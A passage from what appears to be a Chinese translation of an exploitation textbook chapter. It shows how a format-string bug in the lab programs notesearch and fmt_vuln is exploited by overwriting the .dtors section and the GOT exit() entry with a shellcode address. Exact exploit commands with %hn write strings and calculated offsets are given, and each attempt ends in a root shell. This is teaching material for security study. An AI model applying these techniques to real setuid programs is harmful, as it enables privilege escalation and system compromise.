sh-3.2# whoami
root 
sh-3.2#
```

即使`.dtors`部分没有用`0x00000000`的空地址正确终止，shellcode 地址仍然被视为一个析构函数。当程序退出时，shellcode 将被调用，启动一个 root shell。

## 另一个 notesearch 漏洞

除了缓冲区溢出漏洞外，来自第 0x200 章的 notesearch 程序还遭受格式化字符串漏洞。下面的代码列表中显示了该漏洞加粗。

```
int print_notes(int fd, int uid, char *searchstring) {
   int note_length;
   char byte=0, note_buffer[100];

   note_length = find_user_note(fd, uid);
   if(note_length == -1)  // If end of file reached,
      return 0;           //   return 0.

   read(fd, note_buffer, note_length); // Read note data.
   note_buffer[note_length] = 0;       // Terminate the string.

   if(search_note(note_buffer, searchstring)) // If searchstring found,
      `printf(note_buffer);`                    //   print the note.
   return 1; 
}
```

此函数从文件中读取`note_buffer`并打印注释的内容，而不提供自己的格式字符串。虽然此缓冲区不能直接从命令行控制，但可以通过使用 notetaker 程序发送正确数据到文件并使用 notesearch 程序打开该注释来利用漏洞。在以下输出中，notetaker 程序用于创建 notes 以探测 notesearch 程序中的内存。这告诉我们第八个函数参数位于缓冲区的开始处。

```
reader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print "%x."x10')
[DEBUG] buffer   @ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ ./notesearch AAAA
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
AAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .
-------[ end of note data ]-------
reader@hacking:~/booksrc $ ./notetaker BBBB%8\$x
[DEBUG] buffer   @ 0x804a008: 'BBBB%8$x'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ ./notesearch BBBB
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
BBBB42424242
-------[ end of note data ]------- 
reader@hacking:~/booksrc $
```

现在已知内存的相对布局，利用攻击只需将注入的 shellcode 地址覆盖`.dtors`部分即可。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9e8
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9e8 - 0xbfff
$2 = 14825
(gdb) quit
reader@hacking:~/booksrc $ nm ./notesearch | grep DTOR
08049c60 d __DTOR_END__
08049c5c d __DTOR_LIST__
reader@hacking:~/booksrc $ ./notetaker $(printf "\x62\x9c\x04\x08\x60\x9c\x04\
x08")%49143x%8\$hn%14825x%9\$hn
[DEBUG] buffer   @ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ ./notesearch 49143x
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999

                                        21
-------[ end of note data ]-------
sh-3.2# whoami
root
sh-3.2#
```

## 覆写全局偏移表

由于程序可能多次使用共享库中的函数，因此有一个表格来引用所有函数是有用的。编译程序中的另一个特殊部分用于此目的——*程序链接表（PLT）*。

该部分由许多跳转指令组成，每个指令对应一个函数的地址。它就像一个跳板——每次需要调用共享函数时，控制权将通过 PLT 传递。

对易受攻击的格式化字符串程序（fmt_vuln.c）中的 PLT 部分进行对象转储解构显示这些跳转指令：

```
reader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln

./fmt_vuln:     file format elf32-i386

Disassembly of section .plt:

080482b8 <__gmon_start__@plt-0x10>:
 80482b8:       ff 35 6c 97 04 08       pushl  0x804976c
 80482be:       ff 25 70 97 04 08       jmp    *0x8049770
 80482c4:       00 00                   add    %al,(%eax)
        ...

080482c8 <__gmon_start__@plt>:
 80482c8:       ff 25 74 97 04 08       jmp    *0x8049774
 80482ce:       68 00 00 00 00          push   $0x0
 80482d3:       e9 e0 ff ff ff          jmp    80482b8 <_init+0x18>

080482d8 <__libc_start_main@plt>:
 80482d8:       ff 25 78 97 04 08       jmp    *0x8049778
 80482de:       68 08 00 00 00          push   $0x8
 80482e3:       e9 d0 ff ff ff          jmp    80482b8 <_init+0x18>

080482e8 <strcpy@plt>:
 80482e8:       ff 25 7c 97 04 08       jmp    *0x804977c
 80482ee:       68 10 00 00 00          push   $0x10
 80482f3:       e9 c0 ff ff ff          jmp    80482b8 <_init+0x18>

080482f8 <printf@plt>:
 80482f8:       ff 25 80 97 04 08       jmp    *0x8049780
 80482fe:       68 18 00 00 00          push   $0x18
 8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>

08048308 <exit@plt>:
 8048308:       ff 25 84 97 04 08       jmp    *0x8049784
 804830e:       68 20 00 00 00          push   $0x20
 8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18> 
reader@hacking:~/booksrc $
```

这些跳转指令之一与`exit()`函数相关联，该函数在程序结束时被调用。如果用于`exit()`函数的跳转指令可以被操纵以将执行流程导向 shellcode 而不是`exit()`函数，则会启动一个 root shell。下面显示了程序链接表是只读的。

```
reader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 "\ .plt\ "
 10 .plt          00000060  080482b8  080482b8  000002b8  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
```

但更仔细地检查跳转指令（如下所示加粗）揭示它们并不是跳转到地址，而是跳转到地址的指针。例如，`printf()`函数的实际地址存储在内存地址`0x08049780`处的指针，而`exit()`函数的地址存储在`0x08049784`。

```
080482f8 <printf@plt>:
 80482f8:       ff 25 80 97 04 08       jmp     `*0x8049780`
 80482fe:       68 18 00 00 00          push   $0x18
 8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>

08048308 <exit@plt>:
 8048308:       ff 25 84 97 04 08       jmp     `*0x8049784`
 804830e:       68 20 00 00 00          push   $0x20 
 8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18>
```

这些地址存在于另一个部分，称为*全局偏移表（GOT）*，它是可写的。这些地址可以通过使用`objdump`显示二进制的动态重定位条目来直接获得。

```
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049764 R_386_GLOB_DAT    __gmon_start__
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   strcpy
08049780 R_386_JUMP_SLOT   printf
`08049784 R_386_JUMP_SLOT   exit`

reader@hacking:~/booksrc $
```

这表明 `exit()` 函数的地址（如上图中加粗所示）位于 GOT 的 `0x08049784`。如果在此位置覆盖 shellcode 的地址，当程序认为它在调用 `exit()` 函数时，它应该调用 shellcode。

如常，shellcode 被放入环境变量中，其实际位置被预测，并利用格式字符串漏洞来写入值。实际上，shellcode 应该仍然位于之前的环境变量中，这意味着需要调整的只有格式字符串的前 16 个字节。为了清晰起见，将对 `%x` 格式参数的计算再次进行。在下面的输出中，shellcode 的地址（![shellcode 地址](http://atomoreilly.com/source/no_starch_images/254488.png)）被写入 `exit()` 函数的地址（![exit() 函数地址](http://atomoreilly.com/source/no_starch_images/254530.png)）。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at  0xbffff9ec
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049764 R_386_GLOB_DAT    __gmon_start__
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   strcpy
08049780 R_386_JUMP_SLOT   printf 
 08049784 R_386_JUMP_SLOT   exit

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x86\x97\x04\x08\x84\x97\x04\
x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????

                                                         b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8
sh-3.2# whoami
root 
sh-3.2#
```

当 fmt_vuln.c 尝试调用 `exit()` 函数时，`exit()` 函数的地址在 GOT 中查找，并通过 PLT 跳转。由于实际地址已被环境中的 shellcode 地址所替换，因此会启动一个 root shell。

重写 GOT 的另一个优点是，GOT 条目对每个二进制文件是固定的，因此具有相同二进制文件的不同系统将在同一地址处具有相同的 GOT 条目。

能够覆盖任何任意地址为利用提供了许多可能性。基本上，任何可写且包含指向程序执行流程的地址的内存部分都可以成为目标。
